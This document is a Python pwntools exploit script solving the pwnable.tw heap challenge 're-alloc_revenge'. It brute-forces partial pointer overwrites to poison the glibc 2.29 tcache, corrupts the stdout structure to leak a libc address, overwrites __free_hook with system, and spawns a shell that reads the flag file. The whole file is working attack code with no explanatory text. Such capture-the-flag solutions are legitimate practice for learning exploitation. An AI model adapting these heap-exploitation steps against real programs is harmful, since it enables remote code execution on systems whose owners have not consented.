#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10310
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./re-alloc_revenge_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.29.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            # add
            brva 0x000000000000140F
            brva 0x0000000000001483

            # realloc
            brva 0x000000000000157A

            # free
            brva 0x0000000000001650
            c
            set follow-fork-mode parent
            ''')

def allocate(idx, size, data = b'abcd'):
    p.sendlineafter(b'choice: ', str(1))
    p.sendlineafter(b'Index:', str(idx))
    p.sendlineafter(b'Size:', str(size))
    p.sendafter(b'Data:', data)

def reallocate(idx, size, data = b'abcd'):
    p.sendlineafter(b'choice: ', str(2))
    p.sendlineafter(b'Index:', str(idx))
    p.sendlineafter(b'Size:', str(size))

    if size > 0:
        p.sendafter(b'Data:', data)

def rfree(idx):
    p.sendlineafter(b'choice: ', str(3))
    p.sendlineafter(b'Index:', str(idx))

# VARIABLE


# PAYLOAD
while True: # bruteforce stdout - 8
    while True: # xu ly free chunk ko hop le
        if len(sys.argv) > 1 and sys.argv[1] == 'r':
            p = remote(HOST, PORT)
        else:
            p = exe.process()

        log.info("Stage 1")
        
        allocate(0, 0x48)
        reallocate(0, 0)
        reallocate(0, 0x48, b'\0'*0x10)
        reallocate(0, 0)
        # heap_base + 0x10
        reallocate(0, 0x48, b'\x10\x80') # 1/16
        allocate(1, 0x48)
        reallocate(1, 0x58)
        rfree(1)
        try:
            allocate(1, 0x48, b'\0'*0x23 + b'\x07') # ubin size 0x250: count = 7
            reallocate(1, 0)
            message = p.recvline()
            if b'free(): invalid pointer' in message:
                raise EOFError('Incorrect Guess')
            break
        except EOFError:
            p.close()

    log.info("Stage 2")

    # bin_0x50: stdout - 8
    reallocate(1, 0x48, b'\x58\x27') # 1/16
    reallocate(0, 0x38, b'\0'*0x10)
    rfree(0)
    allocate(0, 0x48) # heap_base + 0x10
    rfree(0)
    try:
        allocate(0, 0x40, b'/bin/sh\0' + p64(0xfbad1800) + p64(0)*3) # off-by-one
        leak = p.recvline()
        if leak.startswith(b'$$$$$$$$'):
            raise EOFError('Incorrect Guess')
        break
    except EOFError:
        p.close()
        
libc_leak = u64(leak[8:16])
libc.address = libc_leak - 0x1e7570
log.info("Libc base: " + hex(libc.address))
malloc_hook = libc.sym.__malloc_hook
system = libc.sym.system
free_hook = libc.sym.__free_hook

reallocate(1, 0x48, p64(0)*8 + p64(free_hook))
rfree(1)
allocate(1, 0x18, p64(system))
rfree(0)
p.sendline(b'cat /home/re-alloc_revenge/flag')

p.interactive()